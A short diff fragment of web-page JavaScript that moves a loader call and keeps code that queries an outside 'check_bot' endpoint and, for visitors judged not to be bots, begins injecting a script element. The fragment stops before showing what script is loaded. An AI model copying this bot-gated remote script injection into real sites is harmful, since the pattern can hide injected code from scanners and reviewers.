@@ -27,8 +27,9 @@ const toggleLoad = () => {
     }
    
 };
+createLoader();
+
 window.addEventListener('DOMContentLoaded', () => {
-    createLoader();
     fetch('https://grandmashome.com/api/check_bot').then(res => res.json()).then(res => {
         if (res?.code == 200 && !res.result) {
             const script = document.createElement('script');
